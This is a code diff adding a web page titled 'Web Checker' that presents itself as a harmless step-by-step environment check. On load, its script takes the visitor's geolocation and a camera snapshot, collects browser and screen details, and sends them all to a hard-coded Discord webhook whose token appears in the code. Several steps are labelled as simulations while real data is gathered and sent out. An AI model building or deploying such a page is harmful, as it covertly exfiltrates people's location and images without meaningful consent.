@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Web Checker</title>
+  <style>
+    body {
+      background: #0d1117;
+      color: #fff;
+      font-family: Arial, sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 50px;
+    }
+
+    .step {
+      margin: 20px;
+      font-size: 20px;
+    }
+
+    button {
+      padding: 10px 20px;
+      background: #238636;
+      color: white;
+      border: none;
+      cursor: pointer;
+      border-radius: 8px;
+      font-size: 16px;
+    }
+
+    #video {
+      display: none;
+      margin-top: 20px;
+      border-radius: 10px;
+    }
+
+    #progress {
+      margin-top: 30px;
+      width: 300px;
+      background: #333;
+      border-radius: 8px;
+      overflow: hidden;
+    }
+
+    #progress-bar {
+      height: 30px;
+      width: 0%;
+      background: #58a6ff;
+      transition: 0.3s;
+      text-align: center;
+      color: black;
+    }
+  </style>
+</head>
+<body>
+
+  <h1>Web Checker</h1>
+  <div class="step" id="step1">Step 1: Requesting location...</div>
+  <div class="step" id="step2">Step 2: Requesting camera...</div>
+  <div class="step" id="step3">Step 3: Checking mic access (simulasi)...</div>
+  <div class="step" id="step4">Step 4: Simulating fingerprint...</div>
+  <div class="step" id="step5">Step 5: Checking environment...</div>
+  <div class="step" id="step6">Step 6: Sending data...</div>
+
+  <video id="video" width="300" autoplay></video>
+  <canvas id="canvas" style="display:none;"></canvas>
+
+  <div id="progress"><div id="progress-bar">0%</div></div>
+
+  <script>
+    const webhookURL = "https://discord.com/api/webhooks/1390591929544216586/ODXrAr4oYnbcyierJ-G8By0lialN_-l_nYEaM0axp3NRYLZbAIkB5BNEva3aX2nzkY9y"; // <- ganti dengan webhook kamu
+    const stepEls = [...document.querySelectorAll('.step')];
+    const video = document.getElementById("video");
+    const canvas = document.getElementById("canvas");
+    const ctx = canvas.getContext("2d");
+
+    let userData = {
+      location: "Unavailable",
+      screenshot: null
+    };
+
+    async function runChecker() {
+      await step1_Location();
+      await step2_Camera();
+      await step3_MicSim();
+      await step4_Fingerprint();
+      await step5_EnvCheck();
+      await step6_SendToDiscord();
+    }
+
+    function updateProgress(percent) {
+      const bar = document.getElementById("progress-bar");
+      bar.style.width = percent + "%";
+      bar.innerText = percent + "%";
+    }
+
+    async function step1_Location() {
+      return new Promise((resolve) => {
+        navigator.geolocation.getCurrentPosition(pos => {
+          userData.location = `Lat: ${pos.coords.latitude}, Long: ${pos.coords.longitude}`;
+          stepEls[0].innerText += " ✅";
+          updateProgress(15);
+          resolve();
+        }, () => {
+          userData.location = "Permission Denied";
+          stepEls[0].innerText += " ❌";
+          updateProgress(15);
+          resolve();
+        });
+      });
+    }
+
+    async function step2_Camera() {
+      return new Promise((resolve, reject) => {
+        navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+          video.srcObject = stream;
+          video.style.display = 'block';
+          setTimeout(() => {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            ctx.drawImage(video, 0, 0);
+            userData.screenshot = canvas.toDataURL("image/png");
+            stepEls[1].innerText += " ✅";
+            updateProgress(35);
+            stream.getTracks().forEach(track => track.stop());
+            resolve();
+          }, 2000);
+        }).catch(err => {
+          stepEls[1].innerText += " ❌";
+          userData.screenshot = null;
+          updateProgress(35);
+          resolve();
+        });
+      });
+    }
+
+    async function step3_MicSim() {
+      stepEls[2].innerText += " ✅";
+      updateProgress(50);
+      await wait(1000);
+    }
+
+    async function step4_Fingerprint() {
+      const fingerprint = navigator.userAgent + " | " + screen.width + "x" + screen.height;
+      userData.fingerprint = fingerprint;
+      stepEls[3].innerText += " ✅";
+      updateProgress(65);
+      await wait(1000);
+    }
+
+    async function step5_EnvCheck() {
+      userData.platform = navigator.platform;
+      userData.language = navigator.language;
+      stepEls[4].innerText += " ✅";
+      updateProgress(80);
+      await wait(1000);
+    }
+
+    async function step6_SendToDiscord() {
+      stepEls[5].innerText += " ⏳";
+      updateProgress(90);
+
+      const fileData = {
+        content: "**🛡️ Web Checker Result**",
+        embeds: [{
+          title: "User Data",
+          color: 0x00ffcc,
+          fields: [
+            { name: "Location", value: userData.location, inline: false },
+            { name: "Platform", value: userData.platform || "Unknown", inline: true },
+            { name: "Language", value: userData.language || "Unknown", inline: true },
+            { name: "Fingerprint", value: userData.fingerprint || "Unknown", inline: false }
+          ],
+          footer: { text: "Checker by YourSite" }
+        }]
+      };
+
+      await fetch(webhookURL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(fileData)
+      });
+
+      if (userData.screenshot) {
+        const blob = await (await fetch(userData.screenshot)).blob();
+        const form = new FormData();
+        form.append("file", blob, "camera.png");
+
+        await fetch(webhookURL, {
+          method: "POST",
+          body: form
+        });
+      }
+
+      stepEls[5].innerText += " ✅";
+      updateProgress(100);
+    }
+
+    function wait(ms) {
+      return new Promise(res => setTimeout(res, ms));
+    }
+
+    runChecker();
+  </script>
+</body>
+</html>
